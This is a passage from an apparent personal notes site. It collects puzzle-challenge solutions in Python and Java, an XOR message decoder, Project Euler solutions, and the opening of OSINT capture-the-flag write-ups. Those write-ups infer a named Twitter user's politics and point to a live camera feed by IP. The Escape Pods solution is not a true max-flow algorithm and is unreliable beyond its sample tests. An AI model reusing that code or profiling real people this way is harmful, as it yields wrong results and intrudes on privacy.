run against hidden test cases not shown here.\n\n-- Python cases --\n\nInput:\n`solution.solution('15')`\n\nOutput:\n    `5`\n\nInput:\n`solution.solution('4')`\n\nOutput:\n    `2`\n\n-- Java cases --\nInput:\n`Solution.solution('4')`\n\nOutput:\n    `2`\n\nInput:\n`Solution.solution('15')`\n\nOutput:\n    `5`\n\nUse `verify [file]` to test your solution and see how it does. When you are finished editing your code, use `submit [file]` to submit your answer. If your solution passes the test cases, it will be removed from your home folder.\n\n### Python\n\n```py\ndef solution(n):\n    n = int(n)\n    count = 0\n    while n != 1:\n        count += 1\n        if n % 2 == 0:\n            # Even number, so divide by 2 (// is integer division)\n            n = n // 2\n        elif n % 4 == 1 or n == 3:\n            # If n is 3 or n-1 is divisible by 4, subtract 1\n            n -= 1\n        else:\n            # Otherwise, add 1\n            n += 1\n\n    # Returns the number of operations that took place\n    return count\n\n# Test cases\nprint(solution(1)) # 0\nprint(solution(4)) # 2\nprint(solution(15)) # 5\n```\n","n":0.048}}},{"i":86,"$":{"0":{"v":"Find Access Code","n":0.577},"1":{"v":"\n## Instructions\n\nIn order to destroy Commander Lambda's LAMBCHOP doomsday device, you'll need access to it. But the only door leading to the LAMBCHOP chamber is secured with a unique lock system whose number of passcodes changes daily. Commander Lambda gets a report every day that includes the locks' access codes, but only the Commander knows how to figure out which of several lists contains the access codes. You need to find a way to determine which list contains the access codes once you're ready to go in.\n\nFortunately, now that you're Commander Lambda's personal assistant, Lambda has confided to you that all the access codes are \"lucky triples\" in order to make it easier to find them in the lists. A \"lucky triple\" is a tuple (x, y, z) where x divides y and y divides z, such as (1, 2, 4). With that information, you can figure out which list contains the number of access codes that matches the number of locks on the door when you're ready to go in (for example, if there's 5 passcodes, you'd need to find a list with 5 \"lucky triple\" access codes).\n\nWrite a function solution(l) that takes a list of positive integers l and counts the number of \"lucky triples\" of (li, lj, lk) where the list indices meet the requirement i < j < k.  The length of l is between 2 and 2000 inclusive.  The elements of l are between 1 and 999999 inclusive.  The solution fits within a signed 32-bit integer. Some of the lists are purposely generated without any access codes to throw off spies, so if no triples are found, return 0.\n\nFor example, [1, 2, 3, 4, 5, 6] has the triples: [1, 2, 4], [1, 2, 6], [1, 3, 6], making the solution 3 total.\n\n### Languages\n\nTo provide a Java solution, edit `Solution.java`\n\nTo provide a Python solution, edit `solution.py`\n\n### Test cases\n\nYour code should pass the following test cases.\nNote that it may also be run against hidden test cases not shown here.\n\n-- Java cases --\n\nInput:\n`Solution.solution([1, 1, 1])`\n\nOutput:\n    `1`\n\nInput:\n`Solution.solution([1, 2, 3, 4, 5, 6])`\n\nOutput:\n    `3`\n\n-- Python cases --\n\nInput:\n`solution.solution([1, 2, 3, 4, 5, 6])`\n\nOutput:\n    `3`\n\nInput:\n`solution.solution([1, 1, 1])`\n\nOutput:\n    `1`\n\nUse `verify [file]` to test your solution and see how it does. When you are finished editing your code, use `submit [file]` to submit your answer. If your solution passes the test cases, it will be removed from your home folder.\n\n### Python\n\n```py\ndef solution(l):\n    c = [0] * len(l)\n    count = 0\n\n     # Iterates through the list of passcodes\n    for i in range(len(l)):\n        # Iterates through the passcode's numbers\n        for j in range(i):\n            # Finds how many numbers before the current number are\n            # evenly divisible by the current number\n            if l[i] % l[j] == 0:\n                c[i] += 1\n                count += c[j]\n\n    return count\n\n# Test cases\nprint(solution([1, 1, 1])) # 1\nprint(solution([1, 2, 3, 4, 5, 6])) # 3\nprint(solution([1, 2, 3])) # 0\nprint(solution([])) # 0\n```\n","n":0.046}}},{"i":87,"$":{"0":{"v":"Escape Pods","n":0.707},"1":{"v":"\n## Instructions\n\nYou've blown up the LAMBCHOP doomsday device and relieved the bunnies of their work duries -- and now you need to escape from the space station as quickly and as orderly as possible! The bunnies have all gathered in various locations throughout the station, and need to make their way towards the seemingly endless amount of escape pods positioned in other parts of the station. You need to get the numerous bunnies through the various rooms to the escape pods. Unfortunately, the corridors between the rooms can only fit so many bunnies at a time. What's more, many of the corridors were resized to accommodate the LAMBCHOP, so they vary in how many bunnies can move through them at a time.\n\nGiven the starting room numbers of the groups of bunnies, the room numbers of the escape pods, and how many bunnies can fit through at a time in each direction of every corridor in between, figure out how many bunnies can safely make it to the escape pods at a time at peak.\n\nWrite a function solution(entrances, exits, path) that takes an array of integers denoting where the groups of gathered bunnies are, an array of integers denoting where the escape pods are located, and an array of an array of integers of the corridors, returning the total number of bunnies that can get through at each time step as an int. The entrances and exits are disjoint and thus will never overlap. The path element path[A][B] = C describes that the corridor going from A to B can fit C bunnies at each time step.  There are at most 50 rooms connected by the corridors and at most 2000000 bunnies that will fit at a time.\n\nFor example, if you have:\n```text\nentrances = [0, 1]\nexits = [4, 5]\npath = [\n  [0, 0, 4, 6, 0, 0],  # Room 0: Bunnies\n  [0, 0, 5, 2, 0, 0],  # Room 1: Bunnies\n  [0, 0, 0, 0, 4, 4],  # Room 2: Intermediate room\n  [0, 0, 0, 0, 6, 6],  # Room 3: Intermediate room\n  [0, 0, 0, 0, 0, 0],  # Room 4: Escape pods\n  [0, 0, 0, 0, 0, 0],  # Room 5: Escape pods\n]\n```\n\nThen in each time step, the following might happen:\n```text\n0 sends 4/4 bunnies to 2 and 6/6 bunnies to 3\n1 sends 4/5 bunnies to 2 and 2/2 bunnies to 3\n2 sends 4/4 bunnies to 4 and 4/4 bunnies to 5\n3 sends 4/6 bunnies to 4 and 4/6 bunnies to 5\n```\n\nSo, in total, 16 bunnies could make it to the escape pods at 4 and 5 at each time step.  (Note that in this example, room 3 could have sent any variation of 8 bunnies to 4 and 5, such as 2/6 and 6/6, but the final solution remains the same.)\n\n### Test cases\n\nYour code should pass the following test cases.\n\nNote that it may also be run against hidden test cases not shown here.\n\nInput:\n`solution.solution([0], [3], [[0, 7, 0, 0], [0, 0, 6, 0], [0, 0, 0, 8], [9, 0, 0, 0]])`\n\nOutput:\n    `6`\n\nInput:\n`solution.solution([0, 1], [4, 5], [[0, 0, 4, 6, 0, 0], [0, 0, 5, 2, 0, 0], [0, 0, 0, 0, 4, 4], [0, 0, 0, 0, 6, 6], [0, 0, 0, 0, 0, 0], [0, 0, 0, 0, 0, 0]])`\n\nOutput:\n    `16`\n\n### Python\n\n```py\n\"\"\"\nCalculate the number of bunnies that can make it to the escape pods at a time.\nINPUT:\n- entrances: list of entrance indices\n- exits: list of exit indices\n- path: list of lists of integers representing the capacity of each corridor\nOUTPUT:\n- int: number of bunnies that can make it to the escape pods at a time\n\"\"\"\ndef solution(entrances, exits, path):\n    num_entrances = len(entrances)\n    num_exits = len(exits)\n    corridors = path[num_entrances:-num_exits]\n    num_corridors = len(corridors)\n    bunn_count = 0\n\n    # Loop through range of length of corridors\n    for corridor in range(num_corridors):\n        # Sum of a corridor's possible number of bunnies allowed\n        sum_range = sum(corridors[corridor])\n        sum_enter = 0\n        for entrance in entrances:\n            # All bunnies that enter a corridor\n            sum_enter += path[entrance][num_entrances + corridor]\n\n        # If the sum of the range of bunnies allowed is greater than the sum of\n        # the bunnies that enter the corridor, then the number of bunnies that\n        # can make it to the escape pods is the sum of the bunnies that enter\n        # the corridor\n        bunn_count += min(sum_enter, sum_range)\n\n    return bunn_count\n\n# Test cases\nentrances = [0, 1]\nexits = [4, 5]\npath = [\n  [0, 0, 4, 6, 0, 0],  # Room 0: Bunnies\n  [0, 0, 5, 2, 0, 0],  # Room 1: Bunnies\n  [0, 0, 0, 0, 4, 4],  # Room 2: Intermediate room\n  [0, 0, 0, 0, 6, 6],  # Room 3: Intermediate room\n  [0, 0, 0, 0, 0, 0],  # Room 4: Escape pods\n  [0, 0, 0, 0, 0, 0],  # Room 5: Escape pods\n]\nprint(solution(entrances, exits, path)) # 16\n\nentrances = [0]\nexits = [3]\npath = [\n  [0, 7, 0, 0],  # Room 0: Bunnies\n  [0, 0, 6, 0],  # Room 1: Intermediate room\n  [0, 0, 0, 8],  # Room 2: Intermediate room\n  [9, 0, 0, 0],  # Room 3: Escape pods\n]\nprint(solution(entrances, exits, path)) # 6\n\n```\n","n":0.035}}},{"i":88,"$":{"0":{"v":"Encrypted Message","n":0.707},"1":{"v":"\n```py\nimport base64\n\nMESSAGE = \"\"\"\nGk0eEAYQAEQSTU1fRVQCRQQLGUJJU0JUDgYBAAQUEFJGSldFQhYWQwQPAAABVEkXRg8LAwoBEURG\nSldFQhoLVBMPCQwHHwAQTUpKBAYbDFIXDwAACwdCF1tKShALHwpUCg8JQklTQkUACA8MEQBCF1tK\nShYEFQAQTUpKAwocQhdbSkoSDB1EEBw=\n\"\"\"\n\nKEY = \"ajmeese7\"\n\nresult = []\nfor i, c in enumerate(base64.b64decode(MESSAGE)):\n    result.append(chr(c ^ ord(KEY[i % len(KEY)])))\n\nprint(\"\".join(result))\n```\n","n":0.243}}},{"i":89,"$":{"0":{"v":"Dodge the Lasers","n":0.577},"1":{"v":"\n## Instructions\n\nOh no! You've managed to escape Commander Lambda's collapsing space station in an escape pod with the rescued bunny workers - but Commander Lambda isnt about to let you get away that easily. Lambda sent an elite fighter pilot squadron after you -- and they've opened fire!\n\nFortunately, you know something important about the ships trying to shoot you down. Back when you were still Lambda's assistant, the Commander asked you to help program the aiming mechanisms for the starfighters. They undergo rigorous testing procedures, but you were still able to slip in a subtle bug. The software works as a time step simulation: if it is tracking a target that is accelerating away at 45 degrees, the software will consider the targets acceleration to be equal to the square root of 2, adding the calculated result to the targets end velocity at each timestep. However, thanks to your bug, instead of storing the result with proper precision, it will be truncated to an integer before adding the new velocity to your current position.  This means that instead of having your correct position, the targeting software will erringly report your position as `sum(i=1..n, floor(i*sqrt(2)))` - not far enough off to fail Commander Lambdas testing, but enough that it might just save your life.\n\nIf you can quickly calculate the target of the starfighters' laser beams to know how far off they'll be, you can trick them into shooting an asteroid, releasing dust, and concealing the rest of your escape.  Write a function solution(str_n) which, given the string representation of an integer n, returns the sum of `(floor(1*sqrt(2)) + floor(2*sqrt(2)) + ... + floor(n*sqrt(2)))` as a string. That is, for every number i in the range 1 to n, it adds up all of the integer portions of `i*sqrt(2)`.\n\nFor example, if str_n was \"5\", the solution would be calculated as\n```text\nfloor(1*sqrt(2)) +\nfloor(2*sqrt(2)) +\nfloor(3*sqrt(2)) +\nfloor(4*sqrt(2)) +\nfloor(5*sqrt(2))\n= 1+2+4+5+7 = 19\n```\nso the function would return \"19\".\n\nstr_n will be a positive integer between 1 and 10^100, inclusive. Since n can be very large (up to 101 digits!), using just sqrt(2) and a loop won't work. Sometimes, it's easier to take a step back and concentrate not on what you have in front of you, but on what you don't.\n\n### Test cases\n\nYour code should pass the following test cases.\n\nNote that it may also be run against hidden test cases not shown here.\n\nInput: `solution.solution('77')`\n\nOutput: `4208`\n\nInput: `solution.solution('5')`\n\nOutput: `19`\n\n## Solution\n\nGiven infinite time and resources, the following would work perfectly:\n\n```py\nfrom math import sqrt, floor\n\ndef solution(str_n):\n    n = int(str_n)\n    mod = sqrt(2)\n    return str(sum([int(floor(x * mod)) for x in range(n + 1)]))\n\n# Test cases\nprint(solution(\"5\")) # 19\nprint(solution(\"77\")) # 4208\n```\n\nHowever, this is not the case. The test cases are very large, and the time limit is very short. We need to find a way to optimize this.\n\nAfter doing some research (I am not yet very well-versed in mathematics), I was able to finalize the following solution:\n\n```py\nfrom decimal import Decimal, localcontext\n\n# https://towardsdatascience.com/dodge-the-lasers-fantastic-question-from-googles-hiring-challenge-72363d95fec\ndef solution(str_n):\n    n = Decimal(str_n)\n    with localcontext() as ctx:\n        ctx.prec = 101\n        r = Decimal(2).sqrt()\n        s = 2 + r\n\n        # https://en.wikipedia.org/wiki/Beatty_sequence\n        def solve(n):\n            if n == 0: return 0\n\n            # B = Beatty sequence\n            # r = any irrational number greater than 1 (in our case, sqrt(2))\n            # n = any positive integer (in our case, the input)\n            # s = 2 + sqrt(2)\n            Br_n = int(r * n)\n            Br_n_s = int(Decimal(Br_n) / s)\n\n            # https://oeis.org/A001951\n            return (Br_n * (Br_n + 1)) / 2 - solve(Br_n_s) - Br_n_s * (Br_n_s + 1)\n\n        return str(int(solve(n)))\n\n# Test cases\nprint(solution(\"5\")) # 19\nprint(solution(\"77\")) # 4208\n```\n","n":0.041}}},{"i":90,"$":{"0":{"v":"Bunny Worker Locations","n":0.577},"1":{"v":"\n## Instructions\n\nKeeping track of Commander Lambda's many bunny workers is starting to get tricky. You've been tasked with writing a program to match bunny worker IDs to cell locations.\n\nThe LAMBCHOP doomsday device takes up much of the interior of Commander Lambda's space station, and as a result the work areas have an unusual layout. They are stacked in a triangular shape, and the bunny workers are given numerical IDs starting from the corner, as follows:\n\n```text\n| 7\n| 4 8\n| 2 5 9\n| 1 3 6 10\n```\n\nEach cell can be represented as points (x, y), with x being the distance from the vertical wall, and y being the height from the ground.\n\nFor example, the bunny worker at (1, 1) has ID 1, the bunny worker at (3, 2) has ID 9, and the bunny worker at (2,3) has ID 8. This pattern of numbering continues indefinitely (Commander Lambda has been adding a LOT of workers).\n\nWrite a function solution(x, y) which returns the worker ID of the bunny at location (x, y). Each value of x and y will be at least 1 and no greater than 100,000. Since the worker ID can be very large, return your solution as a string representation of the number.\n\n## Languages\n\nTo provide a Java solution, edit `Solution.java`\n\nTo provide a Python solution, edit `solution.py`\n\n## Test cases\n\nYour code should pass the following test cases.\nNote that it may also be run against hidden test cases not shown here.\n\n-- Java cases --\nInput:\n`Solution.solution(3, 2)`\n\nOutput:\n    9\n\nInput:\n`Solution.solution(5, 10)`\n\nOutput:\n    96\n\n-- Python cases --\n\nInput:\n`solution.solution(5, 10)`\n\nOutput:\n    96\n\nInput:\n`solution.solution(3, 2)`\n\nOutput:\n    9\n\nUse `verify [file]` to test your solution and see how it does. When you are finished editing your code, use `submit [file]` to submit your answer. If your solution passes the test cases, it will be removed from your home folder.\n\n#### Solving\n\nThe answer will always be equal to the [nth triangle number](https://math.stackexchange.com/a/593323/1102947) of the sum of `x` and `y` minus 1 (to adjust for the fact that the first row is 1, not 0) plus `x`.\n\n### Python\n\n```py\n# Return the ID of the bunny at the specified position\ndef solution(x, y):\n    # Gets the nth triangle number and adds the offset for the column number\n    return str(sum(range(x + y - 1)) + x)\n\n# Test cases\nprint(solution(3, 2)) # 9\nprint(solution(5, 10)) # 96\n```\n","n":0.052}}},{"i":91,"$":{"0":{"v":"Braille Translation","n":0.707},"1":{"v":"\n## Instructions\n\nBecause Commander Lambda is an equal-opportunity despot, they have several visually-impaired minions. But Lambda never bothered to follow intergalactic standards for workplace accommodations, so those minions have a hard time navigating her space station. You figure printing out Braille signs will help them, and -- since you'll be promoting efficiency at the same time -- increase your chances of a promotion.\n\nBraille is a writing system used to read by touch instead of by sight. Each character is composed of 6 dots in a 2x3 grid, where each dot can either be a bump or be flat (no bump). You plan to translate the signs around the space station to Braille so that the minions under Commander Lambda's command can feel the bumps on the signs and \"read\" the text with their touch. The special printer which can print the bumps onto the signs expects the dots in the following order:\n1 4\n2 5\n3 6\n\nSo given the plain text word \"code\", you get the Braille dots:\n\n11 10 11 10\n00 01 01 01\n00 10 00 00\n\nWhere 1 represents a bump and 0 represents no bump.  Put together, \"code\" becomes the output string \"100100101010100110100010\".\n\nWrite a function `solution(plaintext)` that takes a string parameter and returns a string of 1's and 0's representing the bumps and absence of bumps in the input string. Your function should be able to encode the 26 lowercase letters, handle capital letters by adding a Braille capitalization mark before that character, and use a blank character (000000) for spaces. All signs on the space station are less than fifty characters long and use only letters and spaces.\n\n## Languages\n\nTo provide a Python solution, edit `solution.py`\n\nTo provide a Java solution, edit `Solution.java`\n\n## Test cases\n\nYour code should pass the following test cases.\n\nNote that it may also be run against hidden test cases not shown here.\n\n-- Python cases --\n\nInput:\n`solution.solution(\"code\")`\n\nOutput:\n    `100100101010100110100010`\n\nInput:\n`solution.solution(\"Braille\")`\n\nOutput:\n    `000001110000111010100000010100111000111000100010`\n\nInput:\n`solution.solution(\"The quick brown fox jumps over the lazy dog\")`\n\nOutput:\n    `000001011110110010100010000000111110101001010100100100101000000000110000111010101010010111101110000000110100101010101101000000010110101001101100111100011100000000101010111001100010111010000000011110110010100010000000111000100000101011101111000000100110101010110110`\n\n-- Java cases --\nInput:\n`Solution.solution(\"code\")`\n\nOutput:\n    `100100101010100110100010`\n\nInput:\n`Solution.solution(\"Braille\")`\n\nOutput:\n    `000001110000111010100000010100111000111000100010`\n\nInput:\n`Solution.solution(\"The quick brown fox jumps over the lazy dog\")`\n\nOutput:\n    `000001011110110010100010000000111110101001010100100100101000000000110000111010101010010111101110000000110100101010101101000000010110101001101100111100011100000000101010111001100010111010000000011110110010100010000000111000100000101011101111000000100110101010110110`\n\nUse `verify [file]` to test your solution and see how it does. When you are finished editing your code, use `submit [file]` to submit your answer. If your solution passes the test cases, it will be removed from your home folder.\n\n### Python\n\n```py\n# https://stackoverflow.com/a/63595350/6456163\nbraille_chars = {\n    'a': '100000',\n    'b': '110000',\n    'c': '100100',\n    'd': '100110',\n    'e': '100010',\n    'f': '110100',\n    'g': '110110',\n    'h': '110010',\n    'i': '010100',\n    'j': '010110',\n    'k': '101000',\n    'l': '111000',\n    'm': '101100',\n    'n': '101110',\n    'o': '101010',\n    'p': '111100',\n    'q': '111110',\n    'r': '111010',\n    's': '011100',\n    't': '011110',\n    'u': '101001',\n    'v': '111001',\n    'w': '010111',\n    'x': '101101',\n    'y': '101111',\n    'z': '101011',\n    ' ': '000000',\n    '!': '000001',\n}\n\ndef solution(string):\n    # Add an `!` before each uppercase letter and convert to lowercase\n    string = ''.join('!' + c.lower() if c.isupper() else c for c in string)\n    # Convert each character to its braille representation\n    braille = ''.join(braille_chars[c] for c in string)\n    return braille\n```\n","n":0.046}}},{"i":92,"$":{"0":{"v":"Bomb Baby","n":0.707},"1":{"v":"\n## Instructions\n\nYou're so close to destroying the LAMBCHOP doomsday device you can taste it! But in order to do so, you need to deploy special self-replicating bombs designed for you by the brightest scientists on Bunny Planet. There are two types: Mach bombs (M) and Facula bombs (F). The bombs, once released into the LAMBCHOP's inner workings, will automatically deploy to all the strategic points you've identified and destroy them at the same time.\n\nBut there's a few catches. First, the bombs self-replicate via one of two distinct processes:\nEvery Mach bomb retrieves a sync unit from a Facula bomb; for every Mach bomb, a Facula bomb is created;\nEvery Facula bomb spontaneously creates a Mach bomb.\n\nFor example, if you had 3 Mach bombs and 2 Facula bombs, they could either produce 3 Mach bombs and 5 Facula bombs, or 5 Mach bombs and 2 Facula bombs. The replication process can be changed each cycle.\n\nSecond, you need to ensure that you have exactly the right number of Mach and Facula bombs to destroy the LAMBCHOP device. Too few, and the device might survive. Too many, and you might overload the mass capacitors and create a singularity at the heart of the space station - not good!\n\nAnd finally, you were only able to smuggle one of each type of bomb - one Mach, one Facula - aboard the ship when you arrived, so that's all you have to start with. (Thus it may be impossible to deploy the bombs to destroy the LAMBCHOP, but that's not going to stop you from trying!)\n\nYou need to know how many replication cycles (generations) it will take to generate the correct amount of bombs to destroy the LAMBCHOP. Write a function solution(M, F) where M and F are the number of Mach and Facula bombs needed. Return the fewest number of generations (as a string) that need to pass before you'll have the exact number of bombs necessary to destroy the LAMBCHOP, or the string \"impossible\" if this can't be done! M and F will be string representations of positive integers no larger than 10^50. For example, if M = \"2\" and F = \"1\", one generation would need to pass, so the solution would be \"1\". However, if M = \"2\" and F = \"4\", it would not be possible.\n\n### Languages\n\nTo provide a Java solution, edit `Solution.java`\n\nTo provide a Python solution, edit `solution.py`\n\n### Test cases\n\nYour code should pass the following test cases.\nNote that it may also be run against hidden test cases not shown here.\n\n-- Java cases --\n\nInput:\n`Solution.solution('2', '1')`\n\nOutput:\n    `1`\n\nInput:\n`Solution.solution('4', '7')`\n\nOutput:\n    `4`\n\n-- Python cases --\n\nInput:\n`solution.solution('4', '7')`\nOutput:\n    `4`\n\nInput:\n`solution.solution('2', '1')`\nOutput:\n    `1`\n\nUse `verify [file]` to test your solution and see how it does. When you are finished editing your code, use `submit [file]` to submit your answer. If your solution passes the test cases, it will be removed from your home folder.\n\n### Python\n\n```py\n\"\"\"\nCalculate how many replication cycles it will take to generate the\ncorrect number of bombs to destroy the LAMBCHOP.\nINPUT: m (string) - the needed number of Mach bombs\n       f (string) - the needed number of Facula bombs\nOUTPUT: (string) - the number of cycles to generate the correct number\n        of bombs to destroy the LAMBCHOP\n\"\"\"\ndef solution(m, f):\n    cycles, m, f = 0, int(m), int(f)\n\n    while True:\n        if m == 1 and f == 1:\n            return str(cycles)\n        elif m == f or m == 0 or f == 0:\n            return \"impossible\"\n\n        # The subtraction-only method was very easy to implement, but\n        # required many more cycles to complete. This method is\n        # far more efficient, as it only requires a single division\n        # operation per iteration.\n        if m > f:\n            if m % f == 0:\n                cycles += m // f - 1\n                m = f\n            else:\n                cycles += m // f\n                m %= f\n        else:\n            if f % m == 0:\n                cycles += f // m - 1\n                f = m\n            else:\n                cycles += f // m\n                f %= m\n\n# Test cases\nprint(solution(\"4\", \"7\")) # \"4\"\nprint(solution(\"2\", \"1\")) # \"1\"\nprint(solution(\"1\", \"1\")) # \"0\"\nprint(solution(\"2\", \"4\")) # \"impossible\"\nprint(solution(\"1\", str(10**50))) # \"99999999999999999999999999999999999999999999999999\"\n```\n","n":0.039}}},{"i":93,"$":{"0":{"v":"Euler Project","n":0.707}}},{"i":94,"$":{"0":{"v":"Smallest multiple","n":0.707},"1":{"v":"\n> This is the HackerRank version of [Euler Project problem #5](https://www.hackerrank.com/contests/projecteuler/challenges/euler005/problem).\n\n### Problem\n\n2520 is the smallest number that can be divided by each of the numbers from 1 to 10 without any remainder.\n\nWhat is the smallest positive number that is evenly divisible by all of the numbers from 1 to N?\n\n#### Input Format\n\nFirst line contains T that denotes the number of test cases. This is followed by T lines, each containing an integer, N.\n\n#### Constraints\n\n- 1 <= T <= 10\n- 1 <= N <= 40\n\n#### Output Format\n\nPrint the required answer for each test case.\n\n### Solution\n\n```java\nimport java.io.*;\nimport java.util.*;\nimport java.text.*;\nimport java.math.*;\nimport java.util.regex.*;\n\npublic class Problem5 {\n  public static void main(String[] args) {\n    Scanner in = new Scanner(System.in);\n    int t = in.nextInt();\n    for (int a0 = 0; a0 < t; a0++) {\n      int n = in.nextInt();\n      System.out.println(LCM(n));\n    }\n  }\n\n  // Least Common Multiple\n  public static long LCM(long n) {\n    long answer = 1;\n\n    for (long i = 1; i <= n; i++) {\n      answer *= i / GCD(i, answer);\n    }\n\n    return answer;\n  }\n\n  // Greatest Common Divisor\n  public static long GCD(long a, long b) {\n    while (b != 0) {\n      long temp = a;\n      a = b;\n      b = temp % b;\n    }\n\n    return a;\n  }\n}\n```\n","n":0.071}}},{"i":95,"$":{"0":{"v":"4","n":1},"1":{"v":"\n> This is the HackerRank version of [Euler Project problem #4](https://www.hackerrank.com/contests/projecteuler/challenges/euler004/problem).\n\n### Problem\n\nA palindromic number reads the same both ways. The largest palindrome made from the product of two 3-digit numbers is 101101 = 143 × 707.\n\nFind the largest palindrome made from the product of two 3-digit numbers which is less than N.\n\n#### Input Format\n\nFirst line contains T that denotes the number of test cases. This is followed by T lines, each containing an integer, N.\n\n#### Constraints\n\n- 1 <= T <= 100\n- 101101 < N < 1000000\n\n#### Output Format\n\nPrint the required answer for each test case in a new line.\n\n### Solution\n\n```java\nimport java.io.*;\nimport java.util.*;\nimport java.text.*;\nimport java.math.*;\nimport java.util.regex.*;\n\npublic class Problem4 {\n  public static final int NUM = 3;\n\n  public static void main(String[] args) {\n    Scanner in = new Scanner(System.in);\n    int t = in.nextInt();\n    for (int a0 = 0; a0 < t; a0++) {\n      int n = in.nextInt();\n      String nines = \"9\";\n      String small = \"1\";\n      for (int i = 1; i < NUM; i++) {\n        nines += \"9\";\n        small += \"0\";\n      }\n\n      int numOne = Integer.parseInt(nines);\n      int numTwo = numOne;\n      int minNum = Integer.parseInt(small);\n      int largestPalindrome = 0;\n\n      while (numOne >= minNum) {\n        while (numTwo >= minNum) {\n          int temp = numOne * numTwo;\n          if (isPalindrome(temp) && temp > largestPalindrome && temp < n) {\n            largestPalindrome = temp;\n          } else if (temp <= largestPalindrome) {\n            break;\n          }\n\n          numTwo--;\n        }\n\n        numOne--;\n        numTwo = numOne;\n      }\n\n      System.out.println(largestPalindrome);\n    }\n  }\n\n\n  public static boolean isPalindrome(int number) {\n    return String.valueOf(number).equals(new StringBuilder(String.valueOf(number)).reverse().toString());\n  }\n}\n```\n","n":0.064}}},{"i":96,"$":{"0":{"v":"Largest prime factor","n":0.577},"1":{"v":"\n> This is the HackerRank version of [Euler Project problem #3](https://www.hackerrank.com/contests/projecteuler/challenges/euler003/problem).\n\n### Problem\n\nThe prime factors of 13195 are 5, 7, 13 and 29.\n\nWhat is the largest prime factor of a given number N?\n\n#### Input Format\n\nFirst line contains T that denotes the number of test cases. This is followed by T lines, each containing an integer, N.\n\n#### Constraints\n\n- 1 <= T <= 10\n- 10 <= N <= 10^12\n\n#### Output Format\n\nFor each test case, display the largest prime factor of N.\n\n### Solution\n\n```java\nimport java.io.*;\nimport java.util.*;\nimport java.text.*;\nimport java.math.*;\nimport java.util.regex.*;\n\npublic class Problem3 {\n  public static void main(String[] args) {\n    Scanner in = new Scanner(System.in);\n    int t = in.nextInt();\n    for (int a0 = 0; a0 < t; a0++) {\n      long n = in.nextLong();\n      int factor = 2;\n      int lastFactor = 1;\n\n      if (n % 2 == 0) {\n        lastFactor = 2;\n        n /= 2;\n\n        while (n % 2 == 0) {\n          n /= 2;\n        }\n      }\n\n      factor = 3;\n      double maxFactor = Math.sqrt(n);\n      while (n > 1 && factor <= maxFactor) {\n        if (n % factor == 0) {\n          n /= factor;\n          lastFactor = factor;\n\n          while (n % factor == 0) {\n            n /= factor;\n          }\n\n          maxFactor = Math.sqrt(n);\n        }\n\n        factor += 2;\n      }\n\n      System.out.println(n == 1 ? lastFactor : n);\n    }\n  }\n}\n```\n","n":0.07}}},{"i":97,"$":{"0":{"v":"Even Fibonacci numbers","n":0.577},"1":{"v":"\n> This is the HackerRank version of [Euler Project problem #2](https://www.hackerrank.com/contests/projecteuler/challenges/euler002/problem).\n\n### Problem\n\nEach new term in the Fibonacci sequence is generated by adding the previous two terms. By starting with 1 and 2, the first 10 terms will be:\n\n1, 2, 3, 5, 8, 13, 21, 34, 55, 89, ...\n\nBy considering the terms in the Fibonacci sequence whose values do not exceed N, find the sum of the even-valued terms.\n\n#### Input Format\n\nFirst line contains T that denotes the number of test cases. This is followed by T lines, each containing an integer, N.\n\n#### Constraints\n\n- 1 <= T <= 10^5\n- 1 <= N <= 4 * 10^16\n\n#### Output Format\n\nPrint the required answer for each test case.\n\n### Solution\n\n```java\nimport java.io.*;\nimport java.util.*;\nimport java.text.*;\nimport java.math.*;\nimport java.util.regex.*;\n\npublic class Problem2 {\n  public static void main (String[] args) {\n    Scanner in = new Scanner(System.in);\n    int t = in.nextInt();\n    for (int a0 = 0; a0 < t; a0++) {\n      long maxNum = in.nextLong();\n      long num = 1;\n      long previousNum = 0;\n      long total = 0;\n\n      while (num < maxNum) {\n        if (num % 2 == 0) {\n          total += num;\n        }\n\n        long temp = previousNum;\n        previousNum = num;\n        num += temp;\n      }\n\n      System.out.println(total);\n    }\n  }\n}\n```\n","n":0.072}}},{"i":98,"$":{"0":{"v":"Multiples of 3 or 5","n":0.447},"1":{"v":"\n> This is the HackerRank version of [Euler Project problem #1](https://www.hackerrank.com/contests/projecteuler/challenges/euler001/problem).\n\n### Problem\n\nIf we list all the natural numbers below 10 that are multiples of 3 or 5, we get 3, 5, 6 and 9. The sum of these multiples is 23.\n\nFind the sum of all the multiples of 3 or 5 below N.\n\n#### Input Format\n\nFirst line contains T that denotes the number of test cases. This is followed by T lines, each containing an integer, N.\n\n#### Constraints\n\n- 1 <= T <= 10^5\n- 1 <= N <= 10^9\n\n#### Output Format\n\nFor each test case, print an integer that denotes the sum of all the multiples of 3 or 5 below N.\n\n### Solution\n\n```java\nimport java.io.*;\nimport java.util.*;\nimport java.text.*;\nimport java.math.*;\nimport java.util.regex.*;\n\npublic class Problem1 {\n  public static void main(String[] args) {\n    Scanner in = new Scanner(System.in);\n    long t = in.nextLong();\n    for (int a0 = 0; a0 < t; a0++) {\n      long n = in.nextLong();\n      long a = 0, b = 0, c = 0;\n\n      // (n-1) because sum BELOW n, %3 removes remainder\n      // on the next line;\n      // /3 gets # of 3 multiples\n      a = (n-1) % 3;\n      a = n - 1 - a;\n      a = a / 3;\n\n      b = (n-1) % 5;\n      b = n - 1 - b;\n      b = b / 5;\n\n      c = (n-1) % 15;\n      c = n - 1 - c;\n      c = c / 15;\n\n      // Add formulae of each segment and subtract duplicates\n      long total = 3*a*(a+1)/2 + 5*b*(b+1)/2 - 15*c*(c+1)/2;\n      System.out.println(total);\n    }\n  }\n}\n```\n","n":0.063}}},{"i":99,"$":{"0":{"v":"CyberSoc","n":1}}},{"i":100,"$":{"0":{"v":"Detective","n":1}}},{"i":101,"$":{"0":{"v":"Vote For Me","n":0.577},"1":{"v":"\nDetermining a Twitter user\\'s political leaning.\n\n```\n> https://twitter.com/jammymarkson\n\n> You'd have thought politics was a bit of a dry subject; not for some.\n\n> What US political party does James over here support?\n```\n\nScrolling through the user's Twitter indicates that the user supported Obama and disliked the policies of Donald Trump, so he is likely a Democrat.\n","n":0.137}}},{"i":102,"$":{"0":{"v":"Readyfortakeoff","n":1},"1":{"v":"\n```\nThe special operations team has learned that a target of theirs always takes the first flight out of their local airport every morning.\n\nPlease find the TIME OF ARRIVAL AT DESTINATION of that first flight, so that we can place officers to arrest them.\n\nOnce again we have very little to go on, aside from what I think is a camera feed.\n\nLIVE CAMERA FEED: http://87.54.59.228\n\nIf you're having trouble viewing it, we've also been given a screenshot by them, which is attached.\n\nPlease enter the time as HH:MM.\n```\n\n![camfeed-3/JPG](./assets/pictures/camfeed-3.JPG)\n\nSince we 